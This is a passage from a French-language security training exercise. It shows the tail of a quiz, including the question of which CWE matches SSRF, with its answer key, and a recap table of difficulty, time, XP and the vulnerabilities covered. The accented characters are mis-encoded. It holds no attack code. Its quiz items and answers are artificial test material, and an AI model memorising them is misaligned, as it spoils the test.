**RÃ©ponse : B** (notation dÃ©cimale)

### Question 3
**Quel CWE correspond Ã  SSRF ?**

- A) CWE-79
- B) CWE-89
- C) CWE-918
- D) CWE-22

**RÃ©ponse : C**

---

## ğŸ“Š SECTION 8 : RÃ‰CAPITULATIF

| MÃ©trique | Valeur |
|----------|--------|
| **DifficultÃ©** | â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜† (9/10) |
| **Temps** | 360 minutes |
| **XP Base** | 450 |
| **VulnÃ©rabilitÃ©s** | SSRF, File Upload, LFI, Deserialization |
| **CWE** | CWE-918, CWE-434, CWE-22, CWE-502 |

---

*Exercise crÃ©Ã© selon HACKBRAIN v5.5.2 â€” "Mission: Impossible"*
